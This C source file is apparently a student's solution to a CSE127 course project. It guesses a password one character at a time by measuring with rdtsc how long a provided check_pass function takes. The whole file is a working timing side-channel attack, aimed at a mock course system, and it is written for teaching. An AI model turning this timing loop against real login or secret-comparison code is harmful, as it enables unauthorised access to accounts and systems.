/*******************************************************
 CSE127 Project
 User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CSE127 Password guesser using timing

 *******************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>

// include our "system" header
#include <stdbool.h>
#include <stdlib.h>

#include "sysapp.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int compare_times(const void *a, const void *b) {
    if (*(unsigned long*)a < *(unsigned long*)b) {
        return -1;
    }
    if (*(unsigned long*)a > *(unsigned long*)b) {
        return 1;
    }
    return 0;
}

int main(int argc, char **argv) {
    char guess[33];
    // set guess to zeros
    bzero(guess, sizeof(guess));
    int found = false;
    for (char len = 0; len<33; len++) {
        char best_letter =0;
        unsigned long best_letter_time = 0;
        char next_letter =0;
        for (next_letter=33; next_letter<=126; next_letter++) {
            unsigned long measurements[5000];
            guess[len] = next_letter;
            for (int i=0; i<5000; i++) {
                unsigned long start = rdtsc();
                if (check_pass(guess)) {
                    found = true;
                    break;
                }
                unsigned long end = rdtsc();
                measurements[i] = end - start;
            }
            if (found) {break;}
            qsort(measurements, 5000, sizeof(unsigned long), compare_times);
            unsigned long median = measurements[2500];
            if (median>best_letter_time) {
                best_letter_time = median;
                best_letter = next_letter;
            }
        }
        if (found) {break;}
        guess[len] = best_letter;
    }
    //
    // do the guessing (this is where your code goes)
    //   we suggest a loop over the size of the possible
    //   password, each time trying all possible characters
    //   and looking for time deviations
    //
    if (check_pass(guess)) {
        printf("Password Found!\n");
        hack_system(guess);
    };

    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};
